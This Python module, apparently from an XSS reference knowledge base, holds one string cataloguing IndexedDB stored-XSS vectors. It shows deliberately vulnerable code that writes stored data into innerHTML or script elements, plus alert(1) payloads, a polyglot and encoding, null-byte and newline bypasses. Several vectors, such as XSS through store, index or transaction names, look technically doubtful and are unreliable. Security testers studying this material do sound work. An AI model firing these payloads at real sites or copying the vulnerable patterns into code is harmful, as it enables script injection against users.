#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-04 19:21:27 UTC
Status: Created
Telegram: https://t.me/easyprotech

IndexedDB XSS Context - Attack Vectors Module
"""

ATTACK_VECTOR = """
INDEXEDDB XSS ATTACK VECTORS:

1. USER PROFILE STORAGE INJECTION:
   Storing user profile data:
   const transaction = db.transaction(['users'], 'readwrite');
   const store = transaction.objectStore('users');

   store.add({
     id: userId,
     name: USER_INPUT,  // Profile name injection
     email: 'user@example.com',
     avatar: '/default.png'
   });

   Later retrieval and display:
   const user = storedUserData.name;
   document.getElementById('profile-name').innerHTML = user;  // XSS execution

2. MESSAGE STORAGE INJECTION:
   Chat message storage:
   const messageStore = db.transaction(['messages'], 'readwrite').objectStore('messages');

   messageStore.add({
     id: Date.now(),
     from: 'user123',
     content: USER_INPUT,  // Message content
     timestamp: Date.now(),
     type: 'text'
   });

   Display message:
   messageDiv.innerHTML = '<b>' + message.from + ':</b> ' + message.content;

3. SETTINGS STORAGE INJECTION:
   Application settings:
   const settings = {
     theme: 'dark',
     language: 'en',
     customCSS: USER_INPUT,  // Custom CSS injection
     notifications: true
   };

   Later application:
   const style = document.createElement('style');
   style.textContent = settings.customCSS;  // XSS in CSS
   document.head.appendChild(style);

4. OFFLINE CONTENT INJECTION:
   Offline page content:
   const offlineStore = db.transaction(['offline'], 'readwrite').objectStore('offline');

   offlineStore.add({
     url: '/article/123',
     title: USER_INPUT,  // Article title
     content: 'Article content...',
     lastModified: Date.now()
   });

   Offline display:
   document.title = article.title;  // XSS in title
   document.getElementById('content').innerHTML = article.content;

5. CACHE MANIPULATION:
   Storing cached responses:
   const cacheStore = db.transaction(['cache'], 'readwrite').objectStore('cache');

   cacheStore.add({
     request: '/api/user',
     response: USER_INPUT,  // Cached response
     timestamp: Date.now(),
     expires: Date.now() + 3600000
   });

   Using cached data:
   const userData = JSON.parse(cachedResponse.response);
   document.getElementById('user-info').innerHTML = userData.html;

ADVANCED INDEXEDDB XSS TECHNIQUES:

6. OBJECT STORE SCHEMA INJECTION:
   Creating malicious object stores:
   const maliciousStore = {
     name: '<script>alert(1)</script>',  // Store name injection
     keyPath: 'id',
     autoIncrement: false
   };

   db.createObjectStore(maliciousStore.name, {
     keyPath: maliciousStore.keyPath
   });

7. INDEX NAME INJECTION:
   Creating indexes with XSS:
   const maliciousIndex = {
     name: '<img src=x onerror=alert(1)>',  // Index name
     keyPath: 'name',
     unique: false
   };

   store.createIndex(maliciousIndex.name, maliciousIndex.keyPath);

8. TRANSACTION NAME INJECTION:
   Transaction naming with XSS:
   const transaction = db.transaction(['users'],
     '<script>alert(1)</script>'  // Transaction name
   );

9. DATABASE NAME INJECTION:
   Opening database with XSS name:
   const request = indexedDB.open('<script>alert(1)</script>', 1);

10. VERSION CHANGE INJECTION:
    Database version upgrade with XSS:
    request.onupgradeneeded = function(event) {
      const db = event.target.result;

      // Inject XSS into version change
      const script = document.createElement('script');
      script.textContent = USER_INPUT;  // Version script injection
      document.head.appendChild(script);
    };

11. CURSOR ITERATION INJECTION:
    Iterating over data with XSS:
    const transaction = db.transaction(['messages']);
    const store = transaction.objectStore('messages');
    const request = store.openCursor();

    request.onsuccess = function(event) {
      const cursor = event.target.result;
      if (cursor) {
        const message = cursor.value;
        displayMessage(message);  // Potential XSS in display
        cursor.continue();
      }
    };

12. BLOB STORAGE INJECTION:
    Storing binary data with XSS:
    const blob = new Blob(['<script>alert(1)</script>'], {type: 'text/html'});
    const blobStore = db.transaction(['blobs'], 'readwrite').objectStore('blobs');

    blobStore.add({
      id: 'user-content',
      data: blob,
      type: 'html'
    });

13. KEY PATH INJECTION:
    Object store with malicious key path:
    const maliciousKeyPath = 'data.<script>alert(1)</script>.value';

    db.createObjectStore('objects', {keyPath: maliciousKeyPath});

14. CONSTRAINT INJECTION:
    Unique constraints with XSS:
    store.createIndex('unique_index', '<script>alert(1)</script>', {unique: true});

15. EVENT HANDLER INJECTION:
    Database event handlers with XSS:
    request.onerror = function(event) {
      // Error message might contain XSS
      showError(event.target.error.message);
    };

INDEXEDDB-SPECIFIC BYPASSES:

16. POLYGLOT STORAGE:
    Storing polyglot payloads that work in multiple contexts:
    javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>

17. ENCODING BYPASSES:
    Storing encoded XSS:
    %3Cscript%3Ealert(1)%3C/script%3E
    \\u003cscript\\u003ealert(1)\\u003c/script\\u003e

18. COMMENT-BASED INJECTION:
    Storing XSS in comments:
    <!-- <script>alert(1)</script> -->
    /* <script>alert(1)</script> */

19. NULL BYTE INJECTION:
    <script>alert(1)</script>%00
    May bypass some validation

20. NEWLINE INJECTION:
    \\n<script>alert(1)</script>
    Can break parsing context

REAL-WORLD ATTACK SCENARIOS:

21. NOTE-TAKING APPLICATION:
    - User saves note: <script>alert('XSS')</script>
    - Note stored in IndexedDB
    - Displayed when app loads
    - Persistent XSS across sessions

22. OFFLINE EMAIL CLIENT:
    - Email stored offline
    - Subject: <script>alert(1)</script>
    - Subject displayed in list
    - Affects all offline usage

23. E-COMMERCE WISHLIST:
    - Product names in wishlist
    - Product: <script>alert(1)</script>
    - Stored offline for later purchase
    - Executes when viewing wishlist

24. SOCIAL MEDIA OFFLINE:
    - Posts cached for offline viewing
    - Post content: <script>alert(1)</script>
    - Executes when viewing offline

25. DOCUMENT COLLABORATION:
    - Collaborative editing
    - Comment: <script>alert(1)</script>
    - Stored in IndexedDB for sync
    - Affects all collaborators

26. PROFILE CUSTOMIZATION:
    - Custom user profiles
    - Bio: <script>alert(1)</script>
    - Displayed on profile page
    - Persistent across logins

27. SETTINGS PERSISTENCE:
    - User preferences
    - Custom theme: <script>alert(1)</script>
    - Applied to all pages
    - Global XSS effect

INDEXEDDB XSS DETECTION:

28. MANUAL TESTING:
    - DevTools Application > IndexedDB inspection
    - Check stored data for malicious content
    - Test data retrieval and display
    - Monitor for script execution

29. AUTOMATED SCANNING:
    - IndexedDB content analysis
    - Stored data validation
    - Retrieval and display testing
    - Offline functionality testing

30. BROWSER EXTENSIONS:
    - IndexedDB monitoring extensions
    - Content inspection tools
    - Storage manipulation detection
"""
